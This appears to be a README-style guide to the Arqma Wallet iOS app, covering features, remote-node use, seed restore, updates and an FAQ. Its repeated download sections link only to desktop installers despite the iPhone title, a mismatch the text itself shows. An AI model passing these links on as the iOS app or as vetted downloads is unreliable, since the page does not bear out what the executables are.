![Arqma Wallet](assets/banner-article.png)

<h1 align="center">Arqma Wallet on iPhone: what the iOS app is and does</h1>

<p align="center">Getting the iOS build, rescanning after install, and what the beta channel is.</p>

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

The iOS app is one of the two native mobile builds the project ships, for iOS 14 and later. Like the Android build it has no daemon and does not mine, so it reads the chain through a remote node. Its documented features are biometric unlock, QR receive and scan, an address book, scan progress shown in a Live Activity, and background sync.

## What the app is

It is a native application rather than a wrapped web page, and it is one of the surfaces the project ships alongside the desktop GUI and the command-line binaries. All of them open the same kind of wallet: one seed, one wallet format across GUI, CLI and mobile.

That last property is what makes a phone useful at all. A wallet created on a desktop can be rebuilt on the phone from the same 25 words, and the addresses that come back are the ones that received the funds. [Arqma Wallet restore from seed](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-restore-from-seed.md) covers the three restore paths.

## What it does, feature by feature

The documented feature list is short, and each item maps to something concrete.

Biometric unlock is optional, and when it is enabled the wallet password is stored in the operating system's secure store rather than in the app's own files. That is a statement about where the password lives, not about whether one exists.

QR codes cover both directions: receiving, by presenting an address, and scanning, by reading one. An address book keeps the destinations you use repeatedly.

The Live Activity shows scan progress on iOS, which matters because a rescan with no visible progress looks the same as a wallet that has stopped.

Background sync is the last item, and it is the reason a wallet opened after a night closed can show a recent balance rather than the one it saw last.

## Why there is no node in the app

The mobile builds have no daemon and no mining, which is a property of the software rather than a setting. A phone therefore cannot hold the chain and cannot serve one.

So the wallet is a client. It reaches a remote node  -  the default is a project-published community node, and the mobile release notes name the first endpoint  -  and everything it displays comes from that node's answers. [Arqma remote node safety](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-remote-node-safety.md) covers what that arrangement does and does not expose.

## What the app cannot do

It is not an exchange and cannot buy or sell crypto. Swap and staking screens, where present, sign transactions locally on the device rather than handing anything to a service.

It cannot run a node, cannot mine, and cannot provide the offline arrangement that the desktop wallet can. Those are limits of the mobile build, stated as limits rather than as missing features.

There is also no account, no email and no KYC step, and no telemetry, no analytics SDK and no advertising SDK. The node connection is the entire external surface. [Arqma Wallet privacy guide](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-privacy-anonymity.md) covers the chain side of the same question.

## Where the numbers on screen come from

The wallet builds its balance from the blocks it has scanned, not from a stored figure. Two numbers describe its position: the height it has reached, and the height the node reports.

Equal means the balance is current. Behind means the screen is showing a partial reading, which is the normal state during a restore and after a long period closed.

A payment is in a block before it is settled: ten confirmations, roughly twenty minutes at the two-minute target block time, is the point at which wallets and merchants treat a transfer as final. [Arqma zero balance after restore](https://github.com/Arqma-Network/payments-and-transfer-fixes/blob/main/arqma-wallet-zero-balance-after-restore.md) covers what a partial scan looks like while it runs.

## Restoring on the phone

The 25 words rebuild the same wallet, with the same addresses, on any device that accepts the format. That is the path that works when a phone is replaced rather than updated, because the wallet is not inside the application.

The restore height is worth setting on a phone in a way it is not on a desktop: a scan from genesis on a mobile device is hours of work, while a scan from the month of creation is minutes. [Arqma Wallet not syncing fix](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-not-syncing.md) covers a scan that appears not to move at all.

## Updating the app

An update replaces the application, not the wallet. The keys live in the seed and the wallet file rather than in the app bundle, so the code that reads them can be replaced without touching them.

That is the same separation that makes desktop updates safe, and it is why "update to the current release" is the ordinary answer to a version question on any platform. The current release from the [Arqma Wallet v0.5.1.2 release](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2) is the build line the mobile apps ship from.

A build older than the newest consensus rules cannot follow the chain regardless of platform, which is why the update question usually comes before any other. [which Arqma Wallet build is current](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-which-build-is-current.md) covers how to establish which build is current.

## Where the funds actually live

On the chain. The phone holds keys and a scan, not a balance, and the chain holds the record of what those keys can spend.

That is why losing a device is a recovery problem rather than a loss, provided the words exist, and why losing both the device and the words is neither: the funds remain at the address and nothing can move them. [lost Arqma seed phrase](https://github.com/Arqma-Network/key-recovery/blob/main/arqma-wallet-lost-seed-phrase.md) covers that case.

## FAQ

### Which iOS versions are supported?

iOS 14 and later.

### Does the iOS app run a node?

No. The mobile builds have no daemon and no mining, so the app always reads through a remote node.

### Where is the wallet password stored when biometrics are on?

In the operating system's secure store, which is why enabling biometric unlock changes where the password lives.

### Can I restore a desktop wallet on the phone?

Yes. One seed and one wallet format are shared across desktop, mobile and the command line.

### Can I buy ARQ in the app?

No. The app is not an exchange and cannot buy or sell crypto.

---

## Download Arqma Wallet

<div align="center">
<a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe"><img alt="Windows" src="assets/button-windows.png"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg"><img alt="macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-10134a?style=for-the-badge&labelColor=090d16&logo=apple&logoColor=f9fcff"></a> <a href="https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz"><img alt="Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-8c7d47?style=for-the-badge&labelColor=090d16&logo=linux&logoColor=f9fcff"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" src="assets/platform-windows.png"> | Windows 10/11, 64-bit | [`Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-windows-x64-Setup.exe) |
| <img alt="macOS" src="https://img.shields.io/badge/platform-macOS-d6efff?style=flat-square&labelColor=090d16&logo=apple&logoColor=f9fcff"> | macOS Intel or Apple Silicon | [`Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-macos-signed.dmg) |
| <img alt="Linux" src="https://img.shields.io/badge/platform-Linux-d6efff?style=flat-square&labelColor=090d16&logo=linux&logoColor=f9fcff"> | Linux x86_64 | [`Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz`](https://github.com/Arqma-Network/Arqma-Wallet/releases/download/v0.5.1.2/Arqma-Wallet-Flutter-5.1.2-linux-x64.tar.gz) |

</div>

All versions and checksums are on the [Arqma Wallet v0.5.1.2 release page](https://github.com/Arqma-Network/Arqma-Wallet/releases/tag/v0.5.1.2).

> **Only download from this GitHub release page.**

---

## Related Arqma Wallet guides

| Guide | What it answers |
| --- | --- |
| [Arqma Wallet download and verify](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-download-and-verify.md) | Checking a downloaded installer against its published hash before you run it. |
| [Arqma Wallet Android APK guide](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-android-apk.md) | Which APK to install, why some builds crash, and where mobile data lives. |
| [Arqma mobile background sync](https://github.com/Arqma-Network/desktop-installation/blob/main/arqma-wallet-mobile-background-sync.md) | Why a phone stops scanning in the background and how to resume it. |
